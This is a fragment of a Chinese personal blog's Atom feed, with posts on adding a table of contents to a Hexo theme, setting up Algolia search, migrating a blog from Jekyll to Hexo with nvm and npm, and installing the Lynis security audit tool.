class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@-<span class="keyword">o</span>-<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;@<span class="keyword">keyframes</span> cd-bounce-<span class="number">1</span>&#123;0%&#123;<span class="attribute">opacity</span>:<span class="number">0</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;60%&#123;<span class="attribute">opacity</span>:<span class="number">1</span>;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1.01);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1.01)&#125;100%&#123;<span class="attribute">-o-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-webkit-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-moz-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">-ms-transform</span>:<span class="built_in">scale</span>(1);<span class="attribute">transform</span>:<span class="built_in">scale</span>(1)&#125;&#125;<span class="selector-class">.show-toc-btn</span>&#123;<span class="attribute">display</span>:none;<span class="attribute">z-index</span>:<span class="number">10</span>;<span class="attribute">width</span>:<span class="number">30px</span>;<span class="attribute">min-height</span>:<span class="number">14px</span>;<span class="attribute">overflow</span>:hidden;<span class="attribute">padding</span>:<span class="number">4px</span> <span class="number">6px</span> <span class="number">8px</span> <span class="number">5px</span>;<span class="attribute">border</span>:<span class="number">1px</span> solid <span class="number">#ddd</span>;<span class="attribute">border-right</span>:none;<span class="attribute">position</span>:fixed;<span class="attribute">right</span>:<span class="number">40px</span>;<span class="attribute">text-align</span>:center;<span class="attribute">background-color</span>:<span class="number">#f9f9f9</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">margin-top</span>:<span class="number">2px</span>;<span class="attribute">display</span>:block;<span class="attribute">width</span>:<span class="number">16px</span>;<span class="attribute">height</span>:<span class="number">14px</span>;<span class="attribute">background</span>:<span class="built_in">url</span>(http://7xtawy.com1.z0.glb.clouddn.com/show.png) no-repeat;<span class="attribute">-webkit-background-size</span>:<span class="number">100%</span>;<span class="attribute">-moz-background-size</span>:<span class="number">100%</span>;<span class="attribute">background-size</span>:<span class="number">100%</span>&#125;<span class="selector-class">.show-toc-btn</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">color</span>:<span class="number">#999</span>;<span class="attribute">font-size</span>:<span class="number">12px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span>&#123;<span class="attribute">cursor</span>:pointer&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-bg</span>&#123;<span class="attribute">background-position</span>:<span class="number">0</span> -<span class="number">16px</span>&#125;<span class="selector-class">.show-toc-btn</span><span class="selector-pseudo">:hover</span> <span class="selector-class">.btn-text</span>&#123;<span class="attribute">font-size</span>:<span class="number">12px</span>;<span class="attribute">color</span>:<span class="number">#ea8010</span>&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">li</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin-left</span>: <span class="number">30px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.toc-article</span> <span class="selector-tag">ol</span>, <span class="selector-class">.toc-article</span> <span class="selector-tag">ul</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改article-ejs文件"><a href="#修改article-ejs文件" class="headerlink" title="修改article.ejs文件"></a>修改article.ejs文件</h3><p>使用的是Hexo的toc函数，<a href="https://hexo.io/zh-cn/docs/helpers#toc" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/helpers#toc</a></p><p>打开 <code>themes\Landscape-x\layout\_partial\article.ejs</code>，在<code>&lt;header&gt;</code>标签添加下面代码<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 目录内容 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">%</span> <span class="attr">if</span> (!<span class="attr">index</span> &amp;&amp; <span class="attr">post.toc</span>)&#123; %&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">"show-toc-btn"</span> <span class="attr">id</span>=<span class="string">"show-toc-btn"</span> <span class="attr">onclick</span>=<span class="string">"showToc();"</span> <span class="attr">style</span>=<span class="string">"display:none"</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-bg"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"btn-text"</span>&gt;</span>文章导航<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"toc-article"</span> <span class="attr">class</span>=<span class="string">"toc-article"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">id</span>=<span class="string">"toc-close"</span> <span class="attr">class</span>=<span class="string">"toc-close"</span> <span class="attr">title</span>=<span class="string">"隐藏导航"</span> <span class="attr">onclick</span>=<span class="string">"showBtn();"</span>&gt;</span>×<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">strong</span> <span class="attr">class</span>=<span class="string">"toc-title"</span>&gt;</span>文章目录<span class="tag">&lt;/<span class="name">strong</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">%-</span> <span class="attr">toc</span>(<span class="attr">post.content</span>) %&gt;</span></span><br><span class="line">         <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showToc</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="actionscript"><span class="function"><span class="keyword">function</span> <span class="title">showBtn</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> toc_article = <span class="built_in">document</span>.getElementById(<span class="string">"toc-article"</span>);</span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> show_toc_btn = <span class="built_in">document</span>.getElementById(<span class="string">"show-toc-btn"</span>);</span></span><br><span class="line"><span class="actionscript">toc_article.setAttribute(<span class="string">"style"</span>,<span class="string">"display:none"</span>);</span></span><br><span class="line"><span class="actionscript">show_toc_btn.setAttribute(<span class="string">"style"</span>,<span class="string">"display:block"</span>);</span></span><br><span class="line"><span class="undefined">&#125;;</span></span><br><span class="line"><span class="undefined">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">%</span> &#125; %&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- 目录内容结束 --&gt;</span></span><br></pre></td></tr></table></figure></p><h3 id="添加目录"><a href="#添加目录" class="headerlink" title="添加目录"></a>添加目录</h3><p>在文章开头添加 <code>toc: true</code></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;有的文章比较长，翻页查阅比较麻烦，添加文章目录功能&lt;/p&gt;
&lt;h2 id=&quot;0x01-添加文章目录&quot;&gt;&lt;a href=&quot;#0x01-添加文章目录&quot; class=&quot;headerlink&quot; title=&quot;0x01 添加文章目录&quot;&gt;&lt;/a&gt;0x01 添加文章目录&lt;/h2&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
  </entry>
  
  <entry>
    <title>use_algolia_search</title>
    <link href="http://www.pa55w0rd.club/use-algolia-search/"/>
    <id>http://www.pa55w0rd.club/use-algolia-search/</id>
    <published>2018-11-20T06:04:40.000Z</published>
    <updated>2018-11-21T09:09:21.950Z</updated>
    
    <content type="html"><![CDATA[<ol><li><p>去<a href="https://www.algolia.com" target="_blank" rel="noopener">algolia</a>官网注册账号</p></li><li><p>新建index索引 Blog</p></li></ol><a id="more"></a><ol start="3"><li>在hex项目下安装 <figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm install hexo-algolia --save</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># export HEXO_ALGOLIA_INDEXING_KEY=xxxxxxxxxxxxxxxxxxxxxx</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo algolia</span></span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Testing HEXO_ALGOLIA_INDEXING_KEY permissions.</span><br><span class="line"><span class="builtin-name">INFO</span>  Start processing</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Identified 45 pages <span class="keyword">and</span> posts <span class="keyword">to</span> index.</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing chunk 1 of 1 (50 items each)</span><br><span class="line"><span class="builtin-name">INFO</span>  [Algolia] Indexing done.</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;ol&gt;
&lt;li&gt;&lt;p&gt;去&lt;a href=&quot;https://www.algolia.com&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;algolia&lt;/a&gt;官网注册账号&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;新建index索引 Blog&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="algolia" scheme="http://www.pa55w0rd.club/tags/algolia/"/>
    
  </entry>
  
  <entry>
    <title>jekyll迁移hexo</title>
    <link href="http://www.pa55w0rd.club/jekyll%E8%BF%81%E7%A7%BBhexo/"/>
    <id>http://www.pa55w0rd.club/jekyll迁移hexo/</id>
    <published>2018-11-19T08:19:09.000Z</published>
    <updated>2018-11-23T07:54:58.359Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><a id="more"></a><h2 id="0x01-安装"><a href="#0x01-安装" class="headerlink" title="0x01 安装"></a>0x01 安装</h2><p>操作系统：Windows 10 子系统 Ubuntu 18.04 </p><p>使用apt install nodejs &amp;&amp; apt install npm 安装之后npm不能用</p><p>通过源码安装，npm也不能用</p><p>node还好，npm就是不能用，最后通过nvm安装成功</p><h3 id="安装node-npm"><a href="#安装node-npm" class="headerlink" title="安装node + npm"></a>安装node + npm</h3><ul><li><p>安装nvm</p>  <figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># wget -qO- https://raw.githubusercontent.com/creationix/nvm/v0.33.11/install.sh | bash</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># source ~/.bashrc</span></span><br></pre></td></tr></table></figure></li><li><p>使用nvm</p>  <figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># nvm ls-remote   <span class="comment">//列出远程所有可用版本</span></span><br><span class="line"># nvm install <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//目前稳定LTS版</span></span><br><span class="line"># nvm ls <span class="comment">//查看已安装版本</span></span><br><span class="line"># nvm use <span class="number">10.13</span><span class="number">.0</span> <span class="comment">//切换到版本</span></span><br><span class="line"><span class="comment">//如果想把某个版本设为默认，可以这么做：</span></span><br><span class="line"># nvm alias <span class="section">default</span> <span class="number">10.13</span><span class="number">.0</span></span><br><span class="line"># nvm use <span class="section">default</span></span><br></pre></td></tr></table></figure></li><li><p>换源</p><p>  官方源可能会被墙，需要换源</p><p>  使用源管理工具 nrm</p>  <figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># npm i -g nrm</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm ls</span></span><br><span class="line"></span><br><span class="line"><span class="string">*</span> <span class="string">npm</span> <span class="bullet">----</span> <span class="attr">https://registry.npmjs.org/</span></span><br><span class="line">  <span class="string">cnpm</span> <span class="meta">---</span> <span class="attr">http://r.cnpmjs.org/</span></span><br><span class="line">  <span class="string">taobao</span> <span class="bullet">-</span> <span class="attr">https://registry.npm.taobao.org/</span></span><br><span class="line">  <span class="string">nj</span> <span class="bullet">-----</span> <span class="attr">https://registry.nodejitsu.com/</span></span><br><span class="line">  <span class="string">rednpm</span> <span class="bullet">-</span> <span class="attr">http://registry.mirror.cqupt.edu.cn/</span></span><br><span class="line">  <span class="string">npmMirror</span>  <span class="attr">https://skimdb.npmjs.com/registry/</span></span><br><span class="line">  <span class="string">edunpm</span> <span class="bullet">-</span> <span class="attr">http://registry.enpmjs.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># nrm use taobao  //切换淘宝源</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><pre><code><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># apt-get install git</span></span><br></pre></td></tr></table></figure></code></pre><h3 id="安装hexo"><a href="#安装hexo" class="headerlink" title="安装hexo"></a>安装hexo</h3><pre><code><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo-<span class="keyword">cli</span></span><br></pre></td></tr></table></figure></code></pre><h2 id="0x02-简单使用"><a href="#0x02-简单使用" class="headerlink" title="0x02 简单使用"></a>0x02 简单使用</h2><h3 id="初始化-init"><a href="#初始化-init" class="headerlink" title="初始化 init"></a>初始化 init</h3><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo init &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># cd &lt;folder&gt;</span></span><br><span class="line"><span class="meta"># npm install</span></span><br></pre></td></tr></table></figure></p><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── <span class="variable">_config</span>.yml     <span class="comment">//配置信息</span></span><br><span class="line">├── package.json    <span class="comment">//应用程序信息</span></span><br><span class="line">├── scaffolds       <span class="comment">//模板文件夹</span></span><br><span class="line">├── source      <span class="comment">//资源文件夹</span></span><br><span class="line">|   ├── <span class="variable">_drafts</span></span><br><span class="line">|   └── <span class="variable">_posts</span>  <span class="comment">//文章</span></span><br><span class="line">└── themes      <span class="comment">//主题文件夹</span></span><br></pre></td></tr></table></figure><h3 id="更换主题"><a href="#更换主题" class="headerlink" title="更换主题"></a>更换主题</h3><p>创建 Hexo 主题非常容易，您只要在 themes 文件夹内，新增一个任意名称的文件夹，并修改 _config.yml 内的 theme 设定，即可切换主题。一个主题可能会有以下的结构：<br><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── languages</span><br><span class="line">├── <span class="keyword">layout</span></span><br><span class="line">├── scripts</span><br><span class="line">└── <span class="keyword">source</span></span><br></pre></td></tr></table></figure></p><p><strong>_config.yml</strong></p><p>主题的配置文件。修改时会自动更新，无需重启服务器。</p><h3 id="新建文章-new"><a href="#新建文章-new" class="headerlink" title="新建文章 new"></a>新建文章 new</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo new [layout] <span class="meta-string">&lt;title&gt;</span></span></span><br></pre></td></tr></table></figure><p>新建一篇文章。如果没有设置 layout 的话，默认使用 _config.yml 中的 default_layout 参数代替。如果标题包含空格的话，请使用引号括起来。</p><h3 id="生成静态文件-generate"><a href="#生成静态文件-generate" class="headerlink" title="生成静态文件 generate"></a>生成静态文件 generate</h3><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hexo <span class="keyword">generate</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-d, –deploy</td><td>文件生成后立即部署网站</td></tr><tr><td>-w, –watch</td><td>监视文件变动</td></tr></tbody></table><h3 id="启动本地服务器-server"><a href="#启动本地服务器-server" class="headerlink" title="启动本地服务器 server"></a>启动本地服务器 server</h3><p>hexo3.0 把服务器独立成单独的模块，需要先安装才能使用<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-server --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo server</span></span><br></pre></td></tr></table></figure></p><table><thead><tr><th>选项</th><th>描述</th></tr></thead><tbody><tr><td>-p, –port</td><td>重设端口</td></tr><tr><td>-s, –static</td><td>只使用静态文件</td></tr><tr><td>-l, –log</td><td>启动日记记录，使用覆盖记录格式</td></tr></tbody></table><h3 id="部署-deploy"><a href="#部署-deploy" class="headerlink" title="部署 deploy"></a>部署 deploy</h3><p>Hexo 提供了快速方便的一键部署功能，让您只需一条命令就能将网站部署到服务器上。</p><p>先安装<code>hexo-deployer-git</code>模块</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># npm install hexo-deployer-git --save</span></span><br><span class="line"></span><br><span class="line"><span class="meta"># hexo deploy</span></span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>-g, –generate</td><td>部署之前预先生成静态文件</td></tr></tbody></table><p>在 <code>_config.yml</code> 中修改参数，可以同时使用多个deployer<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">deploy</span>:</span><br><span class="line">  <span class="attribute">type</span>: git</span><br><span class="line">  <span class="attribute">message</span>: <span class="string">"Update My Blog"</span></span><br><span class="line">  <span class="attribute">branch</span>: master</span><br><span class="line">  <span class="attribute">repository</span>: git<span class="variable">@github</span>.<span class="attribute">com</span>:Pa55w0rd/pa55w0rd-new.github.io.git</span><br></pre></td></tr></table></figure></p><h3 id="清除-clean"><a href="#清除-clean" class="headerlink" title="清除 clean"></a>清除 clean</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo clean</span></span><br></pre></td></tr></table></figure><h3 id="命令简写"><a href="#命令简写" class="headerlink" title="命令简写"></a>命令简写</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># hexo g</span></span><br><span class="line"><span class="meta"># hexo s</span></span><br><span class="line"><span class="meta"># hexo d</span></span><br></pre></td></tr></table></figure><h2 id="0x03-jekyll-迁移至hexo"><a href="#0x03-jekyll-迁移至hexo" class="headerlink" title="0x03 jekyll 迁移至hexo"></a>0x03 jekyll 迁移至hexo</h2><p>把<code>_posts</code>文件夹内的所有文件复制到<code>source/_posts</code> 文件夹，并在<code>_config.yml</code>中修改 <code>new_post_name</code>参数。</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">new_post_name:</span> <span class="symbol">:year-</span><span class="symbol">:month-</span><span class="symbol">:day-</span><span class="symbol">:title</span>.md</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 Markdown（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。&lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
      <category term="hexo" scheme="http://www.pa55w0rd.club/tags/hexo/"/>
    
      <category term="迁移" scheme="http://www.pa55w0rd.club/tags/%E8%BF%81%E7%A7%BB/"/>
    
  </entry>
  
  <entry>
    <title>Lynis + ansible</title>
    <link href="http://www.pa55w0rd.club/lynis/"/>
    <id>http://www.pa55w0rd.club/lynis/</id>
    <published>2018-11-16T07:57:42.000Z</published>
    <updated>2018-12-03T09:36:52.536Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><a href="git clone https://github.com/CISOfy/lynis">项目地址</a></p></blockquote><p>Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 </p><a id="more"></a><p><strong>安装使用</strong><br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载</span></span><br><span class="line">git clone https:<span class="regexp">//gi</span>thub.com<span class="regexp">/CISOfy/</span>lynis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用</span></span><br><span class="line">lynis audit system</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置定时任务，如每天3点运行扫描，并将报告发送电子邮件地址</span></span><br><span class="line"></span><br><span class="line"><span class="number">0</span> <span class="number">3</span> * * * <span class="regexp">/usr/</span>local<span class="regexp">/bin/</span>lynis --quick <span class="number">2</span>&gt;&amp;<span class="number">1</span> | mail -s <span class="string">"Lynis Reports of My Server"</span> you@yourdomain.com</span><br></pre></td></tr></table></figure></p><p>ansible</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;git clone https://github.com/CISOfy/lynis&quot;&gt;项目地址&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Lynis是一款面向Linux、Mac OS X、BSD以及Solaris等Unix类系统的安全审计与强化工具。它能够深入扫描并检测系统中的问题、存在漏洞的软件包以及配置设置，并提出相关解决建议。Lynis能够轻松实现安全评估、合规性测试、漏洞检测、配置管理以及补丁管理。 &lt;/p&gt;
    
    </summary>
    
      <category term="note" scheme="http://www.pa55w0rd.club/categories/note/"/>
    
    
  </entry>
  
  <entry>
    <title>Git修改远程URL</title>
    <link href="http://www.pa55w0rd.club/git_edit_remoteurl/"/>
    <id>http://www.pa55w0rd.club/git_edit_remoteurl/</id>
    <published>2018-11-06T09:04:11.000Z</published>
    <updated>2018-11-21T11:29:09.780Z</updated>
    
